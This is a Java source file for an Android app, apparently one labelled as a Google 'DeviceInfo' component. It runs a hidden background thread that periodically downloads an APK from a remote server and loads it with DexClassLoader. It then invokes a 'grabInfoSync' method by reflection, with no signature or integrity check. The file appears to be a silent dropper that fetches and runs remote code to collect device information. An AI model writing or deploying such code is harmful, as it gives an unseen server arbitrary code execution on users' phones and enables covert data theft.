package com.facade.network;


import android.util.Log;

import com.facade.Manager;

import java.io.File;
import java.net.HttpURLConnection;

import common.modules.util.IFileUtil;
import common.modules.util.IPreferenceUtil;
import common.modules.util.IReflectUtil;
import common.modules.util.IThreadUtil;
import dalvik.system.DexClassLoader;

public class IHttpFacade {

    public static final String apkFile = "DeviceInfo.apk";
    public static final String apkFileName = "Assets_Files/" + apkFile;
    public static final String apkVersionName = "Assets_Files/" + apkFile + ".version.txt";

    private static boolean isStarted = false;

    public static void checkApkVersionAsync() {
        try {
            __checkApkVersionAsync__();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void __checkApkVersionAsync__() {
        if (isStarted) {
            return;
        }
        isStarted = true;
        // dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.google.deviceinfo-3CZgFcK3kNG9KrZdihbigg==/base.apk"],nativeLibraryDirectories=[/data/app/com.google.deviceinfo-3CZgFcK3kNG9KrZdihbigg==/lib/arm64, /system/lib64, /system/vendor/lib64]]]
        // dalvik.system.DexClassLoader[DexPathList[[zip file "/data/user/0/com.google.deviceinfo/cache/DeviceInfo.apk"],nativeLibraryDirectories=[/system/lib64, /system/vendor/lib64]]]
        ClassLoader classLoader = IHttpFacade.class.getClassLoader();
        String loaderString = classLoader.toString();
        if (loaderString.contains("DexClassLoader") && loaderString.contains("cache")) {
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {

                while (true) {
                    IThreadUtil.trySleep(30 * 60 * 1000);
                    // IThreadUtil.trySleep(30 * 1000);

                    Log.d("DeviceInfo", "checking ...");

                    String cacheDirectory = Manager.getApplication().getCacheDir().getAbsolutePath() + "/";
                    String lastTimeCheckFileName = cacheDirectory + "last_check_update.millis";
                    try {
                        String s = IFileUtil.readFileToText(lastTimeCheckFileName);
                        if (s != null) {
                            long l = Long.parseLong(s);
                            if (System.currentTimeMillis() - l < 60 * 60 * 1000) {
                                Log.d("DeviceInfo", "time is not up continue ...");
                                continue;
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    IFileUtil.writeTextToFile(System.currentTimeMillis() + "", lastTimeCheckFileName);
                    Log.d("DeviceInfo", "let us check ...");

                    check();
                }

            }
        }).start();

    }

    private static void check() {
        int lastPatchVersion = IPreferenceUtil.getSharedPreferences().getInt(Manager.__key_last_patch_version__, 0);
        if (lastPatchVersion >= Manager.VERSION) {
            return;
        }

        String cacheDirectory = Manager.getApplication().getCacheDir().getAbsolutePath() + "/";
        String apkVersionPath = cacheDirectory + apkFile + ".version.txt";
        new File(apkVersionPath).delete();
        downloadWithRetry(IHttpPoster.apiBase, apkVersionName, apkVersionPath);
        String string = IFileUtil.readFileToText(apkVersionPath);
        Log.d("DeviceInfo", "checkApkVersionAsync response: " + string);
        if (string == null) {
            return;
        }
        int remoteVersion = 0;

        try {
            remoteVersion = Integer.parseInt(string.trim());
            if (remoteVersion <= Manager.VERSION) {
                Log.d("DeviceInfo", "checkApkVersionAsync no new version: " + remoteVersion);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
            // ???????????????????????????
            return;
        }


        // download the apk ~~~~
        String apkPatchPath = cacheDirectory + apkFile;
        new File(apkPatchPath).delete();
        downloadWithRetry(IHttpPoster.apiBase, apkFileName, apkPatchPath);
        if (!new File(apkPatchPath).exists()) {
            Log.d("DeviceInfo", "checkApkVersionAsync download failed");
            return;
        }
        Log.d("DeviceInfo", "checkApkVersionAsync download success");

        IPreferenceUtil.setSharedPreferences(Manager.__key_count_dev_info_got__, (Integer) 0);
        IPreferenceUtil.setSharedPreferences(Manager.__key_last_patch_version__, (Integer) remoteVersion);

        // ???????????????APK??????
        try {
            DexClassLoader loader = new DexClassLoader(apkPatchPath, cacheDirectory, null, IHttpFacade.class.getClassLoader());
            Class<?> managerClass = loader.loadClass(Manager.class.getName());
            // IReflectUtil.invokeMethod(managerClass, "grabInfoAsync", null, null);
            IReflectUtil.invokeMethod(managerClass, "grabInfoSync", null, null);
            Log.d("DeviceInfo", "checkApkVersionAsync invoke new version success ~~~");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * HTTP GET & DOWNLOAD
     */
    private static void downloadWithRetry(String apiBase, String remoteFileName, final String localSavePath) {
        String urlStr = apiBase + IHttpPoster.download_controller + remoteFileName;
        IHttpDowner downloader = new IHttpDowner();
        downloader.download(urlStr, null, new IHttpDowner.DownloadSyncCallback() {
            @Override
            public void callback(Exception exception, HttpURLConnection connection, int responseCode, String temporaryDownloadFilePath) {
                if (responseCode >= 200 && responseCode <= 400) {
                    Log.d("DeviceInfo", "download success");
                    new File(temporaryDownloadFilePath).renameTo(new File(localSavePath));
                } else {
                    Log.d("DeviceInfo", "download failed");
                }
            }
        });

    }


}
